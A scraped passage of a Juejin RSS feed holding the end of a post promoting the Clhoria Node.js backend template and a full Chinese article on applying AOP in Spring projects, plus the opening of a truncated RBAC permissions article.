<p>在使用 zod-openapi 时，一个常见的性能陷阱是在函数内部定义 Zod Schema，导致每次请求都重新创建对象。Clhoria 提供了一个 Vite 插件，在编译时自动将函数内部的 Schema 定义提升到模块顶部，只创建一次。这个优化对高频接口的性能提升显著，而开发者无需改变编码习惯。</p>
<h3 data-id="heading-9">自动路由发现</h3>
<p>基于 Vite 的 import.meta.glob 自动扫描路由模块，新增功能只需创建目录结构，无需手动注册。Vite 会自动发现新的 index 文件，配合 HMR 立即生效。这降低了 AI 生成代码后的集成成本——生成的模块放到正确位置就能运行。</p>
<h2 data-id="heading-10">企业级能力</h2>
<p>Clhoria 不只是一个开发模板，它提供了生产环境所需的完整能力：</p>
<p>JWT 双密钥认证机制实现 Admin 和 Client 的完全隔离；Casbin RBAC 支持角色继承和动态策略更新；基于 pg-boss 的分布式任务队列支持延迟执行、重试策略和 Saga 事务补偿；日志中间件支持阿里云 SLS、TimescaleDB、Loki 等多种存储方案；基于 excelize-wasm 的 Excel 处理拥有 Golang 同款性能。</p>
<p>所有第三方服务依赖（Sentry、Cloudflare R2 等）均为可选，项目可以完全部署在内网环境，技术栈符合信创要求。</p>
<h2 data-id="heading-11">与传统方案的差异</h2>
<p>传统代码生成器的问题在于：生成的代码是"死"的，缺乏上下文，需要大量手动修改才能融入项目。而且生成器本身需要配置和维护，模板更新后旧代码无法同步。</p>
<p>Clhoria 的 SDD 模式则是让 AI 理解活的规范。CLAUDE.md 配置文件详细描述了项目架构、编码约定、文件组织方式。AI 不是机械地填充模板，而是基于对规范的理解生成符合项目风格的代码。规范更新后，AI 的后续生成自然会遵循新规范。</p>
<p>开发效率的差异更加明显：传统方式需要手工维护接口文档，容易与实现不同步；Clhoria 的 OpenAPI + Zod 方案让代码即文档，类型安全，文档永不过期。传统方式的热更新需要重启服务器等待数秒；Clhoria 的修改毫秒级生效。</p>
<h2 data-id="heading-12">快速开始</h2>
<p>项目仓库地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzhe-qi%2Fclhoria-template" target="_blank" title="https://github.com/zhe-qi/clhoria-template" ref="nofollow noopener noreferrer">github.com/zhe-qi/clho…</a></p>
<p>克隆项目后，安装依赖，复制环境变量配置文件，启动开发服务器，即可访问 localhost:9999 查看 API 文档。项目配套的后台管理前端基于 Refine + Shadcn 开发，仓库地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fzhe-qi%2Frefine-project" target="_blank" title="https://github.com/zhe-qi/refine-project" ref="nofollow noopener noreferrer">github.com/zhe-qi/refi…</a></p>
<p>技术栈基于 Node.js 24+、Hono、Vite、Drizzle ORM、PostgreSQL 18+、Redis 7+，支持实验性的 ts-go 类型检查以获得更好的性能。</p>
<h2 data-id="heading-13">写在最后</h2>
<p>规范驱动开发不是一个新概念，但在 AI 时代它获得了新的生命力。当规范足够精确和完整时，AI 就能从"勉强能用"变成"真正好用"。</p>
<p>Clhoria 是这个理念的一次实践。如果你正在探索 AI 辅助开发的最佳姿势，或者需要一个现代化的企业级后端起点，欢迎尝试。</p>
<p>QQ 交流群：1076889416</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[快手二面：如何在项目中应用AOP？]]></title>    <link>https://juejin.cn/post/7602158221852131343</link>    <guid>https://juejin.cn/post/7602158221852131343</guid>    <pubDate>2026-02-03T06:17:57.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602158221852131343" data-draft-id="7598947628450218011" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="快手二面：如何在项目中应用AOP？"/> <meta itemprop="keywords" content="后端,面试,Java"/> <meta itemprop="datePublished" content="2026-02-03T06:17:57.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员飞鱼"/> <meta itemprop="url" content="https://juejin.cn/user/1665088861772688"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            快手二面：如何在项目中应用AOP？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1665088861772688/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员飞鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:17:57.000Z" title="Tue Feb 03 2026 06:17:57 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"「"}.markdown-body b:after,.markdown-body strong:after{content:"」"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="github-gist">.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#fff;color:#333}.hljs-comment,.hljs-meta{color:#969896}.hljs-emphasis,.hljs-quote,.hljs-strong,.hljs-template-variable,.hljs-variable{color:#df5000}.hljs-keyword,.hljs-selector-tag,.hljs-type{color:#d73a49}.hljs-attribute,.hljs-bullet,.hljs-literal,.hljs-symbol{color:#0086b3}.hljs-name,.hljs-section{color:#63a35c}.hljs-tag{color:#333}.hljs-attr,.hljs-selector-attr,.hljs-selector-class,.hljs-selector-id,.hljs-selector-pseudo,.hljs-title{color:#6f42c1}.hljs-addition{color:#55a532;background-color:#eaffea}.hljs-deletion{color:#bd2c00;background-color:#ffecec}.hljs-link{text-decoration:underline}.hljs-number{color:#005cc5}.hljs-string{color:#032f62}</style><p><strong>文章内容收录到个人网站，方便阅读</strong>：<a href="https://link.juejin.cn?target=http%3A%2F%2Fhardyfish.top%2F" target="_blank" title="http://hardyfish.top/" ref="nofollow noopener noreferrer">hardyfish.top/</a></p>
<p>AOP（Aspect-Oriented Programming，面向切面编程）解决的是一类“横切关注点”问题。</p>
<p>这些逻辑不属于任何一个核心业务用例，却几乎散落在所有用例周围，例如日志、权限、事务、监控、幂等等。</p>
<p>把它们从业务代码里抽离出来，集中声明、统一织入（weaving），业务代码就能保持干净、稳定，治理策略也更可控。</p>
<p><strong>AOP 的典型应用场景（按工程收益排序）</strong></p>
<p>1）统一日志与审计（Audit）</p>
<ul>
<li><strong>访问日志</strong>：记录接口入参、出参、耗时、调用方标识、traceId（链路标识）。</li>
<li><strong>审计日志</strong>：记录“谁在什么时间对什么资源做了什么操作”，通常要求不可抵赖、可追溯。</li>
<li>价值：避免在每个 Service/Controller 里手写 <code>log.info()</code>；字段口径一致，便于检索与风控。</li>
</ul>
<p>典型切点：</p>
<ul>
<li>Controller 层：记录 HTTP 请求维度信息（URI、method、IP、UA）。</li>
<li>Service 层：记录业务动作（下单、退款、审批）与关键业务 ID。</li>
</ul>
<p>2）鉴权、登录态与数据权限</p>
<ul>
<li><strong>接口鉴权</strong>：基于角色/权限点/资源范围的拦截。</li>
<li><strong>数据权限</strong>：例如同一接口返回数据需按部门、租户、组织树过滤。</li>
<li>价值：避免权限判断散落在各处导致遗漏；策略可集中升级（例如从 RBAC 升级到 ABAC）。</li>
</ul>
<p>注意边界：</p>
<ul>
<li>粗粒度鉴权常在网关或过滤器做；细粒度（到方法/资源）更适合 AOP。</li>
</ul>
<p>3）事务管理与一致性边界</p>
<ul>
<li>典型：Spring <code>@Transactional</code> 本质就是 AOP 代理在方法边界开启/提交/回滚事务。</li>
<li>价值：将数据库事务与业务方法边界绑定，避免手写 begin/commit/rollback。</li>
</ul>
<p>常见陷阱（影响实际效果）：</p>
<ul>
<li>同类内部方法调用（self-invocation）绕过代理导致事务不生效。</li>
<li>异步/新线程内执行不继承事务上下文。</li>
<li>仅对 <code>public</code> 方法生效（常见默认代理策略下）。</li>
</ul>
<p>4）性能监控与链路追踪（Metrics/Tracing）</p>
<ul>
<li><strong>耗时埋点</strong>：方法级耗时、异常率、慢调用统计。</li>
<li><strong>Tracing</strong>：在入口生成或透传 traceId/spanId，打通日志、指标与调用链。</li>
<li>价值：性能治理落到方法粒度；定位“慢在哪里”比“慢了”更重要。</li>
</ul>
<p>5）异常治理与统一错误码</p>
<ul>
<li><strong>异常转换</strong>：将底层异常（SQL、RPC、网络）统一转换为领域错误码与可读信息。</li>
<li><strong>降噪</strong>：对可预期异常降级日志级别，对未知异常保留堆栈与告警。</li>
<li>价值：错误口径统一，前端/调用方契约稳定。</li>
</ul>
<p>说明：Web 层的统一异常处理常由 <code>@ControllerAdvice</code> 完成；AOP 更适合 Service/RPC 方法边界的异常策略。</p>
<p>6）幂等、限流、熔断与重试（Resilience）</p>
<ul>
<li><strong>幂等</strong>：重复请求只生效一次（支付回调、消息消费、创建类接口）。</li>
<li><strong>限流/熔断/重试</strong>：围绕外部依赖（RPC、第三方 API）的稳定性策略。</li>
<li>价值：与业务解耦，策略可配置、可迭代。</li>
</ul>
<p>实现方式：</p>
<ul>
<li>AOP + Redis（幂等 key、分布式锁、令牌桶计数）。</li>
<li>AOP + Resilience4j/Sentinel（限流熔断）更常见。</li>
</ul>
<p>7）参数校验与契约约束</p>
<ul>
<li>对方法入参做统一校验（非空、范围、格式、跨字段约束）。</li>
<li>价值：减少重复 <code>if</code> 判断；失败策略统一（错误码、提示语、日志级别）。</li>
</ul>
<p>补充：Java 常用 Bean Validation（JSR 380）在 Controller/Service 也可通过 AOP 触发与增强。</p>
<p>8）缓存（Cache Aside）与防穿透</p>
<ul>
<li>读取前先查缓存，失效再回源；写入后失效缓存。</li>
<li>价值：将缓存策略从业务代码剥离，避免“到处写缓存”导致一致性混乱。</li>
</ul>
<p>注意：缓存与业务一致性强相关，AOP 更适合“可容忍短暂不一致”的读多写少场景；强一致要更谨慎。</p>
<p><strong>在项目中应用 AOP 的落地方式（从设计到上线）</strong></p>
<p>1）先定“切面边界”：在哪一层织入</p>
<p>常用选择：</p>
<ul>
<li><strong>Controller 边界</strong>：更贴近请求语义，适合访问日志、traceId、统一入参脱敏、灰度标记读取。</li>
<li><strong>Service 边界</strong>：更贴近业务动作，适合事务、权限点校验、幂等、审计、指标。</li>
<li><strong>Client/RPC 边界</strong>：更贴近外部依赖，适合重试、熔断、超时、降级、调用统计。</li>
</ul>
<p>边界选择原则：</p>
<ul>
<li>和“责任归属”对齐：谁拥有这个策略的变更权。</li>
<li>和“失败后果”对齐：例如幂等应尽量靠近写入点（Service/Repo）。</li>
</ul>
<p>2）用注解表达意图，用 Pointcut 表达范围</p>
<p>落地基本套路是“自定义注解 + 切点表达式”：</p>
<ul>
<li>注解表达<strong>业务意图</strong>：<code>@Audit</code>、<code>@Idempotent</code>、<code>@RateLimit</code>。</li>
<li>Pointcut 表达<strong>作用范围</strong>：包路径、类/方法、注解、参数类型。</li>
</ul>
<p>示例（概念级）：</p>
<ul>
<li><code>@Pointcut("@annotation(com.xxx.Audit)")</code></li>
<li><code>@Around("execution(* com.xxx..service..*(..)) &amp;&amp; @annotation(audit)")</code></li>
</ul>
<p>这样做的好处是范围可控，避免“一刀切”拦截导致性能与副作用问题。</p>
<p>3）选对 Advice 类型：Around/Before/AfterThrowing</p>
<ul>
<li><strong>@Around</strong>：最常用，可拿到入参、执行目标方法、拿到返回值、捕获异常、统计耗时。</li>
<li><strong>@Before</strong>：做前置校验、上下文准备（traceId、租户信息）。</li>
<li><strong>@AfterReturning</strong>：对返回结果做审计、埋点补充。</li>
<li><strong>@AfterThrowing</strong>：对异常做分类处理、告警、错误码映射。</li>
</ul>
<p>工程上常见组合：</p>
<ul>
<li>监控与耗时：<code>@Around</code></li>
<li>权限：<code>@Before</code> 或 <code>@Around</code></li>
<li>异常治理：<code>@AfterThrowing</code> 或 <code>@Around</code></li>
</ul>
<p>4）把“横切逻辑”做成可配置组件，而不是硬编码</p>
<p>可配置点通常包括：</p>
<ul>
<li>日志采样率、脱敏字段列表、最大入参长度</li>
<li>幂等 key 的生成策略（用户维度、业务单号维度、请求体 hash）</li>
<li>限流阈值、时间窗口、白名单</li>
<li>重试次数、退避策略（指数退避）、只重试的异常类型集合</li>
</ul>
<p>配置来源：</p>
<ul>
<li>Spring <code>@ConfigurationProperties</code></li>
<li>配置中心（Nacos/Apollo 等）</li>
<li>运行时动态开关（灰度）</li>
</ul>
<p>5）处理好顺序与嵌套：@Order 与事务/重试/幂等的关系</p>
<p>多个切面叠加时，“谁包住谁”会改变语义：</p>
<ul>
<li>幂等通常要在最外层：先拦重复请求，再执行业务。</li>
<li>事务要包住写入：但不要被“重试”无脑包住，否则可能造成重复写。</li>
<li>重试更适合包住“外部依赖调用”，而不是整个业务方法。</li>
</ul>
<p>在 Spring 中常用：</p>
<ul>
<li><code>@Order</code> 或实现 <code>Ordered</code> 控制切面优先级（数值越小优先级越高）。</li>
</ul>
<p>6）避免 AOP 的常见坑（影响生产效果）</p>
<ul>
<li><strong>代理失效</strong>：同类内部调用绕过代理；解决方式包括拆分 Bean、通过代理调用、或使用 AspectJ 编织。</li>
<li><strong>切点过宽</strong>：拦截范围太大引起性能问题或误拦截（例如把 getter/setter 也拦了）。</li>
<li><strong>拿不到参数名</strong>：需要编译参数 <code>-parameters</code> 或借助调试信息；否则审计字段提取困难。</li>
<li><strong>线程上下文丢失</strong>：traceId、租户信息在异步场景需显式传递（TTL、MDC 复制等）。</li>
<li><strong>异常吞掉</strong>：切面捕获异常后未再抛出，导致上层误以为成功，必须严格规定异常传播策略。</li>
<li><strong>返回值包装污染</strong>：切面统一包装响应时要考虑接口契约与序列化兼容，通常放在 Web 层更稳。</li>
</ul>
<p>7）一套可复用的“项目级 AOP 套件”长什么样</p>
<p>常见的可落地组合：</p>
<ul>
<li><code>AuditAspect</code>：注解驱动，抽取业务 ID、操作者、动作类型，写审计表或消息。</li>
<li><code>MetricAspect</code>：方法级耗时与异常率，打点到 Prometheus/Micrometer。</li>
<li><code>IdempotentAspect</code>：基于 Redis 的幂等 key + TTL + 并发互斥策略。</li>
<li><code>PermissionAspect</code>：权限点校验 + 数据范围注入（ThreadLocal 或参数增强）。</li>
<li><code>MaskingAspect</code>：日志脱敏，按字段规则处理（手机号、身份证、token）。</li>
</ul>
<p>配套约束：</p>
<ul>
<li>统一的上下文对象（如 <code>RequestContext</code>）承载 traceId、tenantId、operatorId。</li>
<li>统一的异常与错误码体系（枚举 + 领域异常）。</li>
<li>统一的日志字段规范（JSON log、固定 key）。</li>
</ul>
<p>适用边界：什么时候不该用 AOP</p>
<ul>
<li>逻辑与业务强绑定且需要显式可见（例如核心定价、风控决策），隐藏在切面里会降低可读性与审计性。</li>
<li>需要改写控制流且非常复杂（跨多步状态机），AOP 可能让调用路径难以追踪。</li>
<li>极致性能路径（纳秒级/微秒级要求）下，代理与反射开销需要评估，必要时用编译期织入或显式调用。</li>
</ul>
<p><strong>一个落地小案例（文字版）</strong></p>
<p>在“创建订单”场景里常见组合是：</p>
<ul>
<li>
<p>Controller：生成 traceId、记录访问日志、入参脱敏。</p>
</li>
<li>
<p>Service <code>createOrder()</code>：<code>@Idempotent</code> 保证重复提交不重复下单；<code>@Transactional</code> 保证订单与库存扣减原子；</p>
<ul>
<li><code>@Audit</code> 记录“用户创建订单”的审计事件；<code>MetricAspect</code> 记录耗时与异常。</li>
</ul>
</li>
<li>
<p>外部支付调用：在支付 Client 方法上织入 <code>Retry/CircuitBreaker</code>，并记录第三方调用耗时与错误码。</p>
</li>
</ul>
<p>这样业务代码只保留“下单这件事”的关键路径，治理策略集中在切面里，变更也集中发生。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[RBAC 权限系统实战（三）：细粒度的权限控制]]></title>    <link>https://juejin.cn/post/7602146335216664616</link>    <guid>https://juejin.cn/post/7602146335216664616</guid>    <pubDate>2026-02-03T06:17:45.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602146335216664616" data-draft-id="7602161364892925952" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="RBAC 权限系统实战（三）：细粒度的权限控制"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2026-02-03T06:17:45.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="十五丶"/> <meta itemprop="url" content="https://juejin.cn/user/343495027727229"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            RBAC 权限系统实战（三）：细粒度的权限控制
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/343495027727229/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    十五丶
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T06:17:45.000Z" title="Tue Feb 03 2026 06:17:45 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>本文主要讲解 RBAC 后台系统中的按钮级权限控制</p>
<blockquote>
<p>本文是<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fbryqiu%2FBlog%3Ftab%3Dreadme-ov-file%23%25E9%2580%259A%25E4%25BF%2597%25E6%2598%2593%25E6%2587%2582%25E7%259A%2584%25E4%25B8%25AD%25E5%2590%258E%25E5%258F%25B0%25E7%25B3%25BB%25E7%25BB%259F%25E5%25BB%25BA%25E8%25AE%25BE%25E6%258C%2587%25E5%258D%2597%25E4%25B8%2593%25E6%25A0%258F" target="_blank" title="https://github.com/bryqiu/Blog?tab=readme-ov-file#%E9%80%9A%E4%BF%97%E6%98%93%E6%87%82%E7%9A%84%E4%B8%AD%E5%90%8E%E5%8F%B0%E7%B3%BB%E7%BB%9F%E5%BB%BA%E8%AE%BE%E6%8C%87%E5%8D%97%E4%B8%93%E6%A0%8F" ref="nofollow noopener noreferrer">《通俗易懂的中后台系统建设指南》</a>系列的第十一篇文章，该系列旨在告诉你如何构建一个优秀的中后台管理系统。</p>
</blockquote>
<h2 data-id="heading-1">RBAC 权限细粒度</h2>
